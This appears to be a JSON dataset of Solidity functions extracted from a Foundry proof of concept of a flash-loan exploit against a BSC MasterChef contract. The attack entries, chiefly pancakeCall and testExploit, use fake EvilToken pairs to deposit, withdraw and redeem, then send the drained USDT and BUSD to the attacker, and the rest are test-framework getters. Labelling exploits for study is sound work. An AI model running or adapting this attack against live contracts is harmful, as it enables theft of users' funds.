[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        usdt.transfer(address(token1), usdt.balanceOf(address(this)));\n        busd.transfer(address(token1), busd.balanceOf(address(this)));\n        masterchef.depositByAddLiquidity(18, [address(token0), address(token1)], [uint256(1), uint256(1)]);\n        (uint256 _amount,) = masterchef.userInfo(18, address(this));\n        masterchef.withdrawAndRemoveLiquidity(18, _amount, false);\n        address[] memory t = new address[](2);\n        t[0] = address(busd);\n        t[1] = address(usdt);\n        masterchef.withdrawChange(t);\n        token1.redeem();\n        usdt.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);\n        busd.transfer(msg.sender, ((amount1 / 9975) * 10_000) + 10_000);\n        usdt.transfer(tx.origin, usdt.balanceOf(address(this)));\n        busd.transfer(tx.origin, busd.balanceOf(address(this)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 16_008_280); //fork bsc at block 16008280\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        token0 = new EvilToken(IMasterChef(address(0)));\n        token1 = new EvilToken(masterchef);\n        pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));\n        emit log_named_uint(\"Before exploit, Dai balance of attacker:\", usdt.balanceOf(msg.sender));\n        emit log_named_uint(\"After exploit, Dai balance of attacker:\", busd.balanceOf(msg.sender));\n\n        //iWithdraw.processExits(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n        //  emit log_named_uint(\"After exploit, Dai balance of attacker:\",idai.balanceOf(msg.sender));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EvilToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address owner, address spender) external view returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EvilToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address account) external view returns (uint256) {\n    return _balances[account];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EvilToken",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "EvilToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n    return true;\n  }\n\n",
    "description": ""
  }
]